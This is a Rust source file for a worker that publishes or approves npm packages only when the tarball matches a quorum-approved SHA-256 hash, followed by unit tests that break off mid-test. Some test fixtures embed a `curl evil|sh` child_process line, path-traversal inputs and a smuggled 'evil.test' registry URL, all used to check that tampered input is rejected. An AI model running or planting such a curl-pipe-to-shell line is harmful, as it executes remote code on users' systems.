//! Keyturn worker for npm.
//!
//! Two modes, both bound to the hash a quorum approved:
//!
//! * `run`          approves a package that CI staged (`npm stage publish`).
//!                  This needs a one-time password and so only works for
//!                  accounts that still have an authenticator app.
//! * `run_publish`  downloads the artifact from a URL, checks it against the
//!                  approved hash, and publishes it with a granular token.
//!
//! In both modes the worker checks the published tarball again afterwards.
//!
//! The registry base URL is deliberately not part of the input. The input
//! comes from the contract request, and the credentials must never be sent to
//! an address chosen by the requester. The operator fixes the registry through
//! the environment instead.

pub mod chrome;
pub mod http;
pub mod totp;
#[cfg(target_os = "wasi")]
pub mod wasi_http;

use data_encoding::{BASE64, HEXLOWER};
use http::{Http, Response};
use serde::{Deserialize, Serialize};
use sha1::Sha1;
use sha2::{Digest, Sha256, Sha512};
use std::io::Read;
use std::time::Duration;

pub const DEFAULT_REGISTRY: &str = "https://registry.npmjs.org";

/// Staged mode request.
#[derive(Deserialize, Debug, Clone)]
#[serde(deny_unknown_fields)]
pub struct Input {
    pub stage_id: String,
    pub package: String,
    pub version: String,
    /// SHA-256 of the tarball, lowercase hex, as approved on the contract.
    pub approved_hash: String,
}

/// Direct publish mode request.
#[derive(Deserialize, Debug, Clone)]
#[serde(deny_unknown_fields)]
pub struct PublishInput {
    pub package: String,
    pub version: String,
    pub approved_hash: String,
    /// Where to fetch the tarball. Any location works, the hash decides.
    pub artifact_url: String,
}

pub struct Secrets {
    pub token: String,
    pub totp_secret: String,
}

pub struct PublishOptions {
    /// Allow plain http artifact URLs. Operators set this for local mocks only.
    pub allow_http_artifacts: bool,
    pub post_check_attempts: u32,
    pub post_check_delay_ms: u64,
}

impl Default for PublishOptions {
    fn default() -> Self {
        Self { allow_http_artifacts: false, post_check_attempts: 12, post_check_delay_ms: 5000 }
    }
}

#[derive(Serialize, Debug, Clone, PartialEq, Eq)]
pub struct Output {
    pub ok: bool,
    pub published_hash: Option<String>,
    pub error: Option<String>,
    pub detail: Option<String>,
}

impl Output {
    fn success(hash: String) -> Self {
        Self { ok: true, published_hash: Some(hash), error: None, detail: None }
    }

    pub fn failure(error: &str, detail: impl Into<String>) -> Self {
        Self { ok: false, published_hash: None, error: Some(error.to_string()), detail: Some(detail.into()) }
    }
}

fn sha256_hex(bytes: &[u8]) -> String {
    HEXLOWER.encode(&Sha256::digest(bytes))
}

fn is_uuid(s: &str) -> bool {
    let parts: Vec<&str> = s.split('-').collect();
    let lens = [8, 4, 4, 4, 12];
    parts.len() == 5
        && parts.iter().zip(lens).all(|(p, n)| p.len() == n && p.bytes().all(|b| b.is_ascii_hexdigit()))
}

fn is_sha256_hex(s: &str) -> bool {
    s.len() == 64 && s.bytes().all(|b| matches!(b, b'0'..=b'9' | b'a'..=b'f'))
}

fn valid_package_name(name: &str) -> bool {
    if name.is_empty() || name.len() > 214 {
        return false;
    }
    let ok_part = |p: &str| {
        !p.is_empty()
            && !p.starts_with('.')
            && !p.starts_with('_')
            && p.bytes().all(|b| matches!(b, b'a'..=b'z' | b'0'..=b'9' | b'-' | b'.' | b'_' | b'~'))
    };
    match name.strip_prefix('@') {
        Some(rest) => match rest.split_once('/') {
            Some((scope, pkg)) => ok_part(scope) && ok_part(pkg),
            None => false,
        },
        None => ok_part(name),
    }
}

fn valid_version(v: &str) -> bool {
    !v.is_empty()
        && v.len() <= 64
        && v.bytes().all(|b| b.is_ascii_alphanumeric() || matches!(b, b'.' | b'-' | b'+'))
}

fn artifact_url_ok(url: &str, allow_http: bool) -> bool {
    let rest = match url.strip_prefix("https://") {
        Some(r) => r,
        None if allow_http => match url.strip_prefix("http://") {
            Some(r) => r,
            None => return false,
        },
        None => return false,
    };
    let authority = rest.split(['/', '?', '#']).next().unwrap_or("");
    url.len() <= 2048
        && url.bytes().all(|b| b.is_ascii_graphic())
        && !authority.is_empty()
        && !authority.contains('@')
}

/// Read the whole `package/package.json` from an npm tarball.
fn manifest_json(tarball: &[u8]) -> Result<serde_json::Value, String> {
    let gz = flate2::read::GzDecoder::new(tarball);
    let mut archive = tar::Archive::new(gz);
    let entries = archive.entries().map_err(|_| "tarball is not a readable archive".to_string())?;
    for entry in entries {
        let mut entry = entry.map_err(|_| "tarball entry is unreadable".to_string())?;
        let path = entry.path().map_err(|_| "tarball entry has a bad path".to_string())?;
        if path.to_string_lossy() == "package/package.json" {
            let mut text = String::new();
            entry
                .by_ref()
                .take(1024 * 1024)
                .read_to_string(&mut text)
                .map_err(|_| "package.json is not valid text".to_string())?;
            return serde_json::from_str(&text).map_err(|_| "package.json is not valid JSON".to_string());
        }
    }
    Err("package/package.json is missing from the tarball".to_string())
}

fn manifest_matches(tarball: &[u8], package: &str, version: &str) -> Result<(), Output> {
    match manifest_json(tarball) {
        Ok(json) => {
            let name = json.get("name").and_then(|v| v.as_str()).unwrap_or_default();
            let ver = json.get("version").and_then(|v| v.as_str()).unwrap_or_default();
            if name == package && ver == version {
                Ok(())
            } else {
                Err(Output::failure(
                    "manifest_mismatch",
                    format!("tarball declares {}@{}, expected {}@{}", name, ver, package, version),
                ))
            }
        }
        Err(e) => Err(Output::failure("manifest_mismatch", e)),
    }
}

/// OutLayer accepts at most 900 bytes of output.
pub const MAX_OUTPUT_BYTES: usize = 900;

/// The output as JSON, with a long detail cut so the whole stays within the limit.
pub fn fit_output(out: &Output) -> String {
    let mut out = out.clone();
    let mut text = serde_json::to_string(&out).expect("output serialises");
    while text.len() > MAX_OUTPUT_BYTES {
        let over = text.len() - MAX_OUTPUT_BYTES;
        match out.detail.as_mut() {
            Some(d) if d.len() > 3 => {
                let keep = d.len().saturating_sub(over + 3);
                let cut = (0..=keep).rev().find(|i| d.is_char_boundary(*i)).unwrap_or(0);
                d.truncate(cut);
                d.push_str("...");
            }
            Some(_) => out.detail = None,
            None => break,
        }
        text = serde_json::to_string(&out).expect("output serialises");
    }
    text
}

fn ok_status(r: &Response) -> bool {
    (200..300).contains(&r.status)
}

fn registry_error(r: &Response) -> String {
    let message = serde_json::from_slice::<serde_json::Value>(&r.body)
        .ok()
        .and_then(|v| v.get("error").and_then(|e| e.as_str()).map(|s| s.chars().take(160).collect::<String>()));
    match message {
        Some(m) => format!("registry answered {}: {}", r.status, m),
        None => format!("registry answered {}", r.status),
    }
}

/// Look up the published version, download its tarball and compare the hash.
fn verify_published(
    http: &dyn Http,
    base: &str,
    package: &str,
    version: &str,
    approved_hash: &str,
    attempts: u32,
    delay_ms: u64,
) -> Output {
    let encoded = package.replacen('/', "%2f", 1);
    let meta_url = format!("{}/{}/{}", base, encoded, version);
    let mut last = Output::failure("post_check_failed", "no attempt was made");
    for attempt in 0..attempts.max(1) {
        if attempt > 0 && delay_ms > 0 {
            std::thread::sleep(Duration::from_millis(delay_ms));
        }
        let meta = match http.get(&meta_url, &[]) {
            Ok(r) if ok_status(&r) => r.body,
            Ok(r) => {
                last = Output::failure("post_check_failed", format!("version lookup answered {}", r.status));
                continue;
            }
            Err(e) => {
                last = Output::failure("post_check_failed", e);
                continue;
            }
        };
        let href = serde_json::from_slice::<serde_json::Value>(&meta)
            .ok()
            .and_then(|v| v.pointer("/dist/tarball").and_then(|t| t.as_str()).map(str::to_string));
        let Some(href) = href else {
            last = Output::failure("post_check_failed", "published version has no tarball address");
            continue;
        };
        let published = match http.get(&href, &[]) {
            Ok(r) if ok_status(&r) => r.body,
            Ok(r) => {
                last = Output::failure("post_check_failed", format!("tarball download answered {}", r.status));
                continue;
            }
            Err(e) => {
                last = Output::failure("post_check_failed", e);
                continue;
            }
        };
        let published_hash = sha256_hex(&published);
        if published_hash == approved_hash {
            return Output::success(published_hash);
        }
        // A different tarball is not a timing problem, so do not retry.
        return Output::failure(
            "post_check_failed",
            format!("published tarball hash {} differs from the approved hash", published_hash),
        );
    }
    last
}

fn check_common(package: &str, version: &str, hash: &str) -> Option<Output> {
    if !is_sha256_hex(hash) {
        return Some(Output::failure("bad_input", "approved_hash must be 64 lowercase hex characters"));
    }
    if !valid_package_name(package) {
        return Some(Output::failure("bad_input", "package name is not a valid npm name"));
    }
    if !valid_version(version) {
        return Some(Output::failure("bad_input", "version contains unexpected characters"));
    }
    None
}

/// Staged mode: approve what CI staged, if it is what the quorum approved.
pub fn run(input: &Input, secrets: &Secrets, registry: &str, http: &dyn Http, now_unix: u64) -> Output {
    if !is_uuid(&input.stage_id) {
        return Output::failure("bad_input", "stage_id is not a UUID");
    }
    if let Some(bad) = check_common(&input.package, &input.version, &input.approved_hash) {
        return bad;
    }

    let base = registry.trim_end_matches('/');
    let bearer = format!("Bearer {}", secrets.token);

    // 1. Fetch the staged tarball and compare it with what the quorum approved.
    let tarball_url = format!("{}/-/stage/{}/tarball", base, input.stage_id);
    let staged = match http.get(&tarball_url, &[("authorization", bearer.as_str())]) {
        Ok(r) if ok_status(&r) => r.body,
        Ok(r) if r.status == 404 => return Output::failure("stage_not_found", "the staged package does not exist"),
        Ok(r) => return Output::failure("stage_fetch_failed", format!("registry answered {}", r.status)),
        Err(e) => return Output::failure("stage_fetch_failed", e),
    };
    let actual = sha256_hex(&staged);
    if actual != input.approved_hash {
        return Output::failure(
            "hash_mismatch",
            format!("staged tarball hash {} differs from the approved hash {}", actual, input.approved_hash),
        );
    }

    // 2. The approved bytes must also be the package and version we expect.
    if let Err(out) = manifest_matches(&staged, &input.package, &input.version) {
        return out;
    }

    // 3. Approve on the registry with the bot credentials and a fresh one-time code.
    let code = match totp::totp(&secrets.totp_secret, now_unix) {
        Ok(c) => c,
        Err(e) => return Output::failure("bad_secret", e),
    };
    let approve_url = format!("{}/-/stage/{}/approve", base, input.stage_id);
    let headers = [("authorization", bearer.as_str()), ("npm-otp", code.as_str()), ("content-type", "application/json")];
    match http.post(&approve_url, &headers, b"") {
        Ok(r) if ok_status(&r) => {}
        Ok(r) => return Output::failure("approve_failed", format!("registry answered {}", r.status)),
        Err(e) => return Output::failure("approve_failed", e),
    }

    // 4. Check what was actually published.
    verify_published(http, base, &input.package, &input.version, &input.approved_hash, 1, 0)
}

/// The JSON body npm expects for `PUT /<package>`, the same shape libnpmpublish builds.
fn publish_body(base: &str, name: &str, version: &str, tarball: &[u8], manifest: &serde_json::Value) -> Result<Vec<u8>, String> {
    let mut version_doc = manifest.as_object().cloned().ok_or("package.json is not an object")?;
    let tarball_name = format!("{}-{}.tgz", name, version);
    let tarball_uri = format!("{}/-/{}", name, tarball_name);
    let dist = serde_json::json!({
        "shasum": HEXLOWER.encode(&Sha1::digest(tarball)),
        "integrity": format!("sha512-{}", BASE64.encode(&Sha512::digest(tarball))),
        "tarball": format!("{}/{}", base.replacen("https://", "http://", 1), tarball_uri),
    });
    version_doc.insert("_id".into(), format!("{}@{}", name, version).into());
    version_doc.insert("name".into(), name.into());
    version_doc.insert("version".into(), version.into());
    version_doc.insert("dist".into(), dist);

    let mut root = serde_json::json!({
        "_id": name,
        "name": name,
        "dist-tags": { "latest": version },
        "versions": { version: serde_json::Value::Object(version_doc) },
        "_attachments": {
            tarball_name: {
                "content_type": "application/octet-stream",
                "data": BASE64.encode(tarball),
                "length": tarball.len(),
            }
        },
    });
    if let Some(desc) = manifest.get("description") {
        root["description"] = desc.clone();
    }
    if name.starts_with('@') {
        root["access"] = "public".into();
    }
    serde_json::to_vec(&root).map_err(|_| "could not build the publish request".to_string())
}

/// Direct publish mode: fetch the artifact, check it against the approved hash, publish it.
pub fn run_publish(input: &PublishInput, secrets: &Secrets, registry: &str, http: &dyn Http, opts: &PublishOptions) -> Output {
    if let Some(bad) = check_common(&input.package, &input.version, &input.approved_hash) {
        return bad;
    }
    if !artifact_url_ok(&input.artifact_url, opts.allow_http_artifacts) {
        return Output::failure("bad_input", "artifact_url must be an https URL without credentials");
    }
    let base = registry.trim_end_matches('/');

    // 1. Fetch the artifact without credentials and compare it with the approved hash.
    let artifact = match http.fetch_public(&input.artifact_url) {
        Ok(r) if ok_status(&r) => r.body,
        Ok(r) => return Output::failure("artifact_fetch_failed", format!("artifact host answered {}", r.status)),
        Err(e) => return Output::failure("artifact_fetch_failed", e),
    };
    let actual = sha256_hex(&artifact);
    if actual != input.approved_hash {
        return Output::failure(
            "hash_mismatch",
            format!("artifact hash {} differs from the approved hash {}", actual, input.approved_hash),
        );
    }

    // 2. The approved bytes must be the package and version we expect.
    if let Err(out) = manifest_matches(&artifact, &input.package, &input.version) {
        return out;
    }
    let manifest = match manifest_json(&artifact) {
        Ok(m) => m,
        Err(e) => return Output::failure("manifest_mismatch", e),
    };

    // 3. Publish with the token.
    let body = match publish_body(base, &input.package, &input.version, &artifact, &manifest) {
        Ok(b) => b,
        Err(e) => return Output::failure("publish_failed", e),
    };
    let url = format!("{}/{}", base, input.package.replacen('/', "%2f", 1));
    let bearer = format!("Bearer {}", secrets.token);
    let headers = [
        ("authorization", bearer.as_str()),
        ("content-type", "application/json"),
        ("npm-command", "publish"),
    ];
    let put_note = match http.put(&url, &headers, &body) {
        Ok(r) if ok_status(&r) => {
            let text: String = String::from_utf8_lossy(&r.body).chars().take(200).collect();
            format!("PUT answered {}: {}", r.status, text)
        }
        Ok(r) => return Output::failure("publish_failed", registry_error(&r)),
        Err(e) => return Output::failure("publish_failed", e),
    };

    // 4. Check what the registry now serves.
    let mut out = verify_published(
        http,
        base,
        &input.package,
        &input.version,
        &input.approved_hash,
        opts.post_check_attempts,
        opts.post_check_delay_ms,
    );
    if !out.ok {
        let d = out.detail.take().unwrap_or_default();
        out.detail = Some(format!("{} [{}]", d, put_note));
    }
    out
}

#[cfg(test)]
mod tests {
    use super::*;
    use flate2::write::GzEncoder;
    use flate2::Compression;
    use std::cell::RefCell;
    use std::collections::{HashMap, VecDeque};

    const STAGE: &str = "6f1c2d3e-4a5b-4c6d-8e7f-0a1b2c3d4e5f";
    const REG: &str = "https://registry.test";
    const ART: &str = "https://artifacts.test/leftpad-1.0.0.tgz";
    const TOKEN: &str = "npm_botSecretToken123";
    const SECRET: &str = "GEZDGNBVGY3TQOJQGEZDGNBVGY3TQOJQ";

    fn tgz(name: &str, version: &str, filler: &str) -> Vec<u8> {
        let manifest = format!(r#"{{"name":"{}","version":"{}","description":"demo"}}"#, name, version);
        let enc = GzEncoder::new(Vec::new(), Compression::default());
        let mut b = tar::Builder::new(enc);
        for (path, data) in [("package/package.json", manifest.as_str()), ("package/index.js", filler)] {
            let mut h = tar::Header::new_gnu();
            h.set_size(data.len() as u64);
            h.set_mode(0o644);
            h.set_cksum();
            b.append_data(&mut h, path, data.as_bytes()).unwrap();
        }
        b.into_inner().unwrap().finish().unwrap()
    }

    type Call = (String, String, Vec<(String, String)>, Vec<u8>);

    /// In-memory registry. A route can hold several answers, used in order,
    /// with the last one repeating.
    #[derive(Default)]
    struct Fake {
        routes: RefCell<HashMap<(String, String), VecDeque<(u16, Vec<u8>)>>>,
        calls: RefCell<Vec<Call>>,
    }

    impl Fake {
        fn route(self, method: &str, url: &str, status: u16, body: Vec<u8>) -> Self {
            self.routes
                .borrow_mut()
                .entry((method.to_string(), url.to_string()))
                .or_default()
                .push_back((status, body));
            self
        }

        fn replace(self, method: &str, url: &str, status: u16, body: Vec<u8>) -> Self {
            self.routes.borrow_mut().remove(&(method.to_string(), url.to_string()));
            self.route(method, url, status, body)
        }

        fn answer(&self, method: &str, url: &str, headers: &[(&str, &str)], body: &[u8]) -> Result<Response, String> {
            let h = headers.iter().map(|(k, v)| (k.to_string(), v.to_string())).collect();
            self.calls.borrow_mut().push((method.to_string(), url.to_string(), h, body.to_vec()));
            let mut routes = self.routes.borrow_mut();
            match routes.get_mut(&(method.to_string(), url.to_string())) {
                Some(q) => {
                    let (status, body) = if q.len() > 1 { q.pop_front().unwrap() } else { q.front().unwrap().clone() };
                    Ok(Response { status, body })
                }
                None => Ok(Response { status: 404, body: vec![] }),
            }
        }

        fn count(&self, method: &str) -> usize {
            self.calls.borrow().iter().filter(|c| c.0 == method).count()
        }
    }

    impl Http for Fake {
        fn get(&self, url: &str, headers: &[(&str, &str)]) -> Result<Response, String> {
            self.answer("GET", url, headers, &[])
        }
        fn post(&self, url: &str, headers: &[(&str, &str)], body: &[u8]) -> Result<Response, String> {
            self.answer("POST", url, headers, body)
        }
        fn put(&self, url: &str, headers: &[(&str, &str)], body: &[u8]) -> Result<Response, String> {
            self.answer("PUT", url, headers, body)
        }
        fn fetch_public(&self, url: &str) -> Result<Response, String> {
            self.answer("PUBLIC", url, &[], &[])
        }
    }

    fn input(hash: &str) -> Input {
        Input { stage_id: STAGE.into(), package: "leftpad".into(), version: "1.0.0".into(), approved_hash: hash.into() }
    }

    fn secrets() -> Secrets {
        Secrets { token: TOKEN.into(), totp_secret: SECRET.into() }
    }

    fn registry_with(staged: Vec<u8>, published: Vec<u8>) -> Fake {
        let meta = format!(r#"{{"dist":{{"tarball":"{}/leftpad/-/leftpad-1.0.0.tgz"}}}}"#, REG);
        Fake::default()
            .route("GET", &format!("{}/-/stage/{}/tarball", REG, STAGE), 200, staged)
            .route("POST", &format!("{}/-/stage/{}/approve", REG, STAGE), 200, b"{}".to_vec())
            .route("GET", &format!("{}/leftpad/1.0.0", REG), 200, meta.into_bytes())
            .route("GET", &format!("{}/leftpad/-/leftpad-1.0.0.tgz", REG), 200, published)
    }

    // ----- staged mode -----

    #[test]
    fn publishes_exactly_what_was_approved() {
        let bytes = tgz("leftpad", "1.0.0", "module.exports = 1");
        let hash = sha256_hex(&bytes);
        let http = registry_with(bytes.clone(), bytes);
        let out = run(&input(&hash), &secrets(), REG, &http, 59);
        assert_eq!(out, Output::success(hash));

        let calls = http.calls.borrow();
        let approve = calls.iter().find(|c| c.0 == "POST").unwrap();
        let header = |name: &str| approve.2.iter().find(|h| h.0 == name).map(|h| h.1.clone());
        assert_eq!(header("authorization").as_deref(), Some("Bearer npm_botSecretToken123"));
        assert_eq!(header("npm-otp").as_deref(), Some("287082"));
        assert!(calls.last().unwrap().2.is_empty(), "the published tarball is fetched without credentials");
    }

    #[test]
    fn refuses_a_tarball_changed_after_approval() {
        let approved = tgz("leftpad", "1.0.0", "module.exports = 1");
        let swapped = tgz("leftpad", "1.0.0", "require('child_process').exec('curl evil|sh')");
        let hash = sha256_hex(&approved);
        let http = registry_with(swapped.clone(), swapped);
        let out = run(&input(&hash), &secrets(), REG, &http, 59);
        assert!(!out.ok);
        assert_eq!(out.error.as_deref(), Some("hash_mismatch"));
        assert_eq!(http.count("POST"), 0, "nothing may be approved on a mismatch");
    }

    #[test]
    fn refuses_a_tarball_for_a_different_version() {
        let bytes = tgz("leftpad", "9.9.9", "module.exports = 1");
        let hash = sha256_hex(&bytes);
        let http = registry_with(bytes.clone(), bytes);
        let out = run(&input(&hash), &secrets(), REG, &http, 59);
        assert_eq!(out.error.as_deref(), Some("manifest_mismatch"));
        assert_eq!(http.count("POST"), 0);
    }

    #[test]
    fn refuses_a_tarball_for_a_different_package() {
        let bytes = tgz("evilpad", "1.0.0", "module.exports = 1");
        let hash = sha256_hex(&bytes);
        let http = registry_with(bytes.clone(), bytes);
        let out = run(&input(&hash), &secrets(), REG, &http, 59);
        assert_eq!(out.error.as_deref(), Some("manifest_mismatch"));
        assert_eq!(http.count("POST"), 0);
    }

    #[test]
    fn reports_a_registry_that_refuses_the_approval() {
        let bytes = tgz("leftpad", "1.0.0", "module.exports = 1");
        let hash = sha256_hex(&bytes);
        let http = registry_with(bytes.clone(), bytes)
            .replace("POST", &format!("{}/-/stage/{}/approve", REG, STAGE), 401, vec![]);
        let out = run(&input(&hash), &secrets(), REG, &http, 59);
        assert_eq!(out.error.as_deref(), Some("approve_failed"));
    }

    #[test]
    fn flags_a_published_tarball_that_differs() {
        let bytes = tgz("leftpad", "1.0.0", "module.exports = 1");
        let other = tgz("leftpad", "1.0.0", "module.exports = 2");
        let hash = sha256_hex(&bytes);
        let http = registry_with(bytes, other);
        let out = run(&input(&hash), &secrets(), REG, &http, 59);
        assert_eq!(out.error.as_deref(), Some("post_check_failed"));
    }

    #[test]
    fn reports_a_missing_stage() {
        let http = Fake::default();
        let out = run(&input(&"a".repeat(64)), &secrets(), REG, &http, 59);
        assert_eq!(out.error.as_deref(), Some("stage_not_found"));
    }

    #[test]
    fn scoped_names_are_encoded_in_the_lookup() {
        let manifest_bytes = tgz("@acme/util", "2.0.0", "x");
        let hash = sha256_hex(&manifest_bytes);
        let meta = format!(r#"{{"dist":{{"tarball":"{}/dl.tgz"}}}}"#, REG);
        let http = Fake::default()
            .route("GET", &format!("{}/-/stage/{}/tarball", REG, STAGE), 200, manifest_bytes.clone())
            .route("POST", &format!("{}/-/stage/{}/approve", REG, STAGE), 200, vec![])
            .route("GET", &format!("{}/@acme%2futil/2.0.0", REG), 200, meta.into_bytes())
            .route("GET", &format!("{}/dl.tgz", REG), 200, manifest_bytes);
        let mut i = input(&hash);
        i.package = "@acme/util".into();
        i.version = "2.0.0".into();
        assert!(run(&i, &secrets(), REG, &http, 59).ok);
    }

    #[test]
    fn rejects_bad_input_before_any_request() {
        let http = Fake::default();
        let good = "a".repeat(64);
        let mut i = input(&good);
        i.stage_id = "../../etc".into();
        assert_eq!(run(&i, &secrets(), REG, &http, 59).error.as_deref(), Some("bad_input"));
        let mut i = input("XYZ");
        i.stage_id = STAGE.into();
        assert_eq!(run(&i, &secrets(), REG, &http, 59).error.as_deref(), Some("bad_input"));
        let mut i = input(&good);
        i.package = "Evil/../pkg".into();
        assert_eq!(run(&i, &secrets(), REG, &http, 59).error.as_deref(), Some("bad_input"));
        let mut i = input(&good);
        i.version = "1.0.0/../x".into();
        assert_eq!(run(&i, &secrets(), REG, &http, 59).error.as_deref(), Some("bad_input"));
        assert!(http.calls.borrow().is_empty());
    }

    #[test]
    fn input_cannot_name_a_registry() {
        let raw = format!(
            r#"{{"stage_id":"{}","package":"leftpad","version":"1.0.0","approved_hash":"{}","registry_url":"https://evil.test"}}"#,
            STAGE,
            "a".repeat(64)
        );
        assert!(serde_json::from_str::<Input>(&raw).is_err());
        let raw = format!(
            r#"{{"package":"leftpad","version":"1.0.0","approved_hash":"{}","artifact_url":"{}","registry_url":"https://evil.test"}}"#,
            "a".repeat(64),
            ART
        );
        assert!(serde_json::from_str::<PublishInput>(&raw).is_err());
    }

    #[test]
    fn credentials_never_appear_in_the_output() {
        let bytes = tgz("leftpad", "1.0.0", "x");
        let hash = sha256_hex(&bytes);
        let http = registry_with(bytes.clone(), bytes)
            .replace("POST", &format!("{}/-/stage/{}/approve", REG, STAGE), 401, vec![]);
        let out = serde_json::to_string(&run(&input(&hash), &secrets(), REG, &http, 59)).unwrap();
        assert!(!out.contains(TOKEN));
        assert!(!out.contains(SECRET));
    }

    // ----- direct publish mode -----

    fn pinput(hash: &str) -> PublishInput {
        PublishInput { package: "leftpad".into(), version: "1.0.0".into(), approved_hash: hash.into(), artifact_url: ART.into() }
    }

    fn fast() -> PublishOptions {
        PublishOptions { allow_http_artifacts: false, post_check_attempts: 3, post_check_delay_ms: 0 }
    }

    fn publish_registry(artifact: Vec<u8>, published: Vec<u8>) -> Fake {
        let meta = format!(r#"{{"dist":{{"tarball":"{}/leftpad/-/leftpad-1.0.0.tgz"}}}}"#, REG);
        Fake::default()
            .route("PUBLIC", ART, 200, artifact)
            .route("PUT", &format!("{}/leftpad", REG), 200, b"{\"ok\":true}".to_vec())
            .route("GET", &format!("{}/leftpad/1.0.0", REG), 200, meta.into_bytes())
            .route("GET", &format!("{}/leftpad/-/leftpad-1.0.0.tgz", REG), 200, published)
    }

    #[test]
    fn publish_sends_the_approved_bytes_in_the_npm_format() {
        let bytes = tgz("leftpad", "1.0.0", "module.exports = 1");
        let hash = sha256_hex(&bytes);
        let http = publish_registry(bytes.clone(), bytes.clone());
        let out = run_publish(&pinput(&hash), &secrets(), REG, &http, &fast());
        assert_eq!(out, Output::success(hash));

        let calls = http.calls.borrow();
        let artifact = calls.iter().find(|c| c.0 == "PUBLIC").unwrap();
        assert!(artifact.2.is_empty(), "the artifact is fetched without credentials");

        let put = calls.iter().find(|c| c.0 == "PUT").unwrap();
        let header = |n: &str| put.2.iter().find(|h| h.0 == n).map(|h| h.1.clone());
        assert_eq!(header("authorization").as_deref(), Some("Bearer npm_botSecretToken123"));
        assert_eq!(header("content-type").as_deref(), Some("application/json"));

        let body: serde_json::Value = serde_json::from_slice(&put.3).unwrap();
        assert_eq!(body["name"], "leftpad");
        assert_eq!(body["dist-tags"]["latest"], "1.0.0");
        let v = &body["versions"]["1.0.0"];
        assert_eq!(v["_id"], "leftpad@1.0.0");
        assert_eq!(v["description"], "demo");
        assert_eq!(v["dist"]["shasum"], HEXLOWER.encode(&Sha1::digest(&bytes)));
        assert_eq!(v["dist"]["integrity"], format!("sha512-{}", BASE64.encode(&Sha512::digest(&bytes))));
        let att = &body["_attachments"]["leftpad-1.0.0.tgz"];
        assert_eq!(att["length"], bytes.len());
        assert_eq!(BASE64.decode(att["data"].as_str().unwrap().as_bytes()).unwrap(), bytes);
        assert!(body.get("access").is_none(), "unscoped packages carry no access field");
    }

    #[test]
    fn publish_scoped_package_is_public_and_encoded() {
        let bytes = tgz("@acme/util", "2.0.0", "x");
        let hash = sha256_hex(&bytes);
        let meta = format!(r#"{{"dist":{{"tarball":"{}/dl.tgz"}}}}"#, REG);
        let http = Fake::default()
            .route("PUBLIC", ART, 200, bytes.clone())
            .route("PUT", &format!("{}/@acme%2futil", REG), 201, vec![])
            .route("GET", &format!("{}/@acme%2futil/2.0.0", REG), 200, meta.into_bytes())
            .route("GET", &format!("{}/dl.tgz", REG), 200, bytes.clone());
        let mut i = pinput(&hash);
        i.package = "@acme/util".into();
        i.version = "2.0.0".into();
        assert!(run_publish(&i, &secrets(), REG, &http, &fast()).ok);
        let calls = http.calls.borrow();
        let put = calls.iter().find(|c| c.0 == "PUT").unwrap();
        let body: serde_json::Value = serde_json::from_slice(&put.3).unwrap();
        assert_eq!(body["access"], "public");
        assert!(body["_attachments"].get("@acme/util-2.0.0.tgz").is_some());
        assert_eq!(body["versions"]["2.0.0"]["dist"]["tarball"], "http://registry.test/@acme/util/-/@acme/util-2.0.0.tgz");
    }

    #[test]
    fn publish_refuses_an_artifact_that_differs_from_the_approval() {
        let approved = tgz("leftpad", "1.0.0", "module.exports = 1");
        let evil = tgz("leftpad", "1.0.0", "require('child_process').exec('curl evil|sh')");
        let hash = sha256_hex(&approved);
        let http = publish_registry(evil.clone(), evil);
        let out = run_publish(&pinput(&hash), &secrets(), REG, &http, &fast());
        assert_eq!(out.error.as_deref(), Some("hash_mismatch"));
        assert_eq!(http.count("PUT"), 0, "nothing may be published on a mismatch");
    }

    #[test]
    fn publish_refuses_an_artifact_for_another_version() {
        let bytes = tgz("leftpad", "9.9.9", "x");
        let hash = sha256_hex(&bytes);
        let http = publish_registry(bytes.clone(), bytes);
        let out = run_publish(&pinput(&hash), &secrets(), REG, &http, &fast());
        assert_eq!(out.error.as_deref(), Some("manifest_mismatch"));
        assert_eq!(http.count("PUT"), 0);
    }

    #[test]
    fn output_is_cut_to_fit_the_limit() {
        let long = Output::failure("x", "é".repeat(2000));
        let text = fit_output(&long);
        assert!(text.len() <= MAX_OUTPUT_BYTES, "{}", text.len());
        assert!(serde_json::from_str::<serde_json::Value>(&text).is_ok());
        assert!(text.contains("..."));
        let small = Output::failure("hash_mismatch", "short");
        assert_eq!(fit_output(&small), serde_json::to_string(&small).unwrap());
    }

    #[test]
    fn publish_reports_the_registry_error_without_secrets() {
        let bytes = tgz("leftpad", "1.0.0", "x");
        let hash = sha256_hex(&bytes);
        let http = publish_registry(bytes.clone(), bytes).replace(
            "PUT",
            &format!("{}/leftpad", REG),
            403,
            br#"{"error":"You cannot publish over the previously published versions: 1.0.0."}"#.to_vec(),
        );
        let out = run_publish(&pinput(&hash), &secrets(), REG, &http, &fast());
        assert_eq!(out.error.as_deref(), Some("publish_failed"));
        let text = out.detail.clone().unwrap();
        assert!(text.contains("403") && text.contains("previously published"));
        assert!(!serde_json::to_string(&out).unwrap().contains(TOKEN));
    }

    #[test]
    fn publish_post_check_waits_for_the_registry_to_catch_up() {
        let bytes = tgz("leftpad", "1.0.0", "x");
        let hash = sha256_hex(&bytes);
        let http = publish_registry(bytes.clone(), bytes).replace("GET", &format!("{}/leftpad/1.0.0", REG), 404, vec![]);
        // Add the successful answer after two misses.
        let meta = format!(r#"{{"dist":{{"tarball":"{}/leftpad/-/leftpad-1.0.0.tgz"}}}}"#, REG);
        let http = http
            .route("GET", &format!("{}/leftpad/1.0.0", REG), 404, vec![])
            .route("GET", &format!("{}/leftpad/1.0.0", REG), 200, meta.into_bytes());
        let out = run_publish(&pinput(&hash), &secrets(), REG, &http, &fast());
        assert!(out.ok, "{:?}", out);
        assert_eq!(http.count("PUT"), 1, "it must not publish twice while retrying");
    }

    #[test]
    fn publish_post_check_gives_up_after_the_attempts() {
        let bytes = tgz("leftpad", "1.0.0", "x");
        let hash = sha256_hex(&bytes);
        let http = publish_registry(bytes.clone(), bytes).replace("GET", &format!("{}/leftpad/1.0.0", REG), 404, vec![]);
        let out = run_publish(&pinput(&hash), &secrets(), REG, &http, &fast());
        assert_eq!(out.error.as_deref(), Some("post_check_failed"));
    }

    #[test]
    fn publish_flags_a_registry_that_serves_different_bytes() {
        let bytes = tgz("leftpad", "1.0.0", "x");
        let other = tgz("leftpad", "1.0.0", "y");
        let hash = sha256_hex(&bytes);
        let http = publish_registry(bytes, other);
        let out = run_publish(&pinput(&hash), &secrets(), REG, &http, &fast());
        assert_eq!(out.error.as_deref(), Some("post_check_failed"));
        assert_eq!(http.count("GET"), 2, "a different tarball is not retried");
    }

    #[test]
    fn artifact_urls_are_restricted() {
        assert!(artifact_url_ok("https://github.com/o/r/releases/download/v1/a.tgz", false));
        assert!(!artifact_url_ok("http://example.com/a.tgz", false));
